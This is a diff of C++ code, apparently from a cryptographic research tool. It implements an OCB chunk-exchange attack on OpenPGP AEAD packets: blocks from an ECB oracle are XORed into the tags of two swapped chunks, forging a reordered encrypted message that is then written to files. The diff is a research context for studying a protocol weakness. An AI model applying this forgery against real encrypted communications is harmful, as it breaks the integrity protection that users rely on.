@@ -255,9 +255,39 @@ void ocb_attack_change_order_of_chunks(uint32_t iter,
     // no need to append another block (zero block) because the final CFB ciphertext block is not subject to block
     std::cout << "OCB chunk exchange attack: first oracle query ...\n";
     // decryption, this is done in the called function:
-    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_decr_blocks_from_oracle =
+    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_encr_blocks_from_oracle =
         invoke_ecb_opgp_decr(std::format("{}-ocb-exch-ord-of-chunks-att-init-query-pgp-msg", iter), ctl, vec_ct, oracle_ciphertext_blocks, pkesk, decr_params, session_key, msg_file_path);
     std::cout << "... OCB chunk exchange attack: first oracle query completed\n";
 
-    std::cout << "... OCB chunk exchange attack is not completely implemented\n";
+    //std::cout << "... OCB chunk exchange attack is not completely implemented\n";
+    //parse g as S_1 || . . . || S_n || S'_1 . . . || S'_n with N
+    if (ecb_encr_blocks_from_oracle.size() % 2)
+    {
+        throw Exception("invalid uneven size of 2nd oracle query for OCB block exchange attack");
+    }
+    //size_t cnt_split = 0
+    cipher_block_t<AES_BLOCK_SIZE> S_xor_sum;
+    for (cipher_block_t<AES_BLOCK_SIZE> const& block : ecb_encr_blocks_from_oracle)
+    {
+        S_xor_sum ^= block;
+    }
+    cipher_block_vec_t<AES_BLOCK_SIZE> new_tags;
+    new_tags.push_back(aead_packet.aead_chunks()[1].auth_tag);
+    new_tags.push_back(aead_packet.aead_chunks()[0].auth_tag);
+    new_tags[0] ^= S_xor_sum; 
+    new_tags[1] ^= S_xor_sum; 
+
+    std::vector<aead_chunk_t> first_two_new_chunks = { 
+        {.encrypted = aead_packet.aead_chunks()[1].encrypted, .auth_tag = new_tags[0].to_uint8_vec() },  
+        {.encrypted = aead_packet.aead_chunks()[0].encrypted, .auth_tag = new_tags[1].to_uint8_vec() }
+    };
+    aead_packet_t mod_aead_packet(aead_packet); 
+    mod_aead_packet.rewrite_chunk(first_two_new_chunks[0], 0);
+    mod_aead_packet.rewrite_chunk(first_two_new_chunks[1], 1);
+    auto encoded_mod_aead_packet  = mod_aead_packet.get_encoded();
+    ctl.potentially_write_run_time_file(encoded_mod_aead_packet, std::format("{}-aead-packet-with-first-two-chunks-exchanged", iter));
+    std::vector<uint8_t> mod_msg(pkesk.begin(), pkesk.end());
+    mod_msg.insert(mod_msg.end(), encoded_mod_aead_packet.begin(), encoded_mod_aead_packet.end());
+    ctl.potentially_write_run_time_file(mod_msg, std::format("{}-pkesk-then-aead-packet-with-first-two-chunks-exchanged", iter));
+
 }
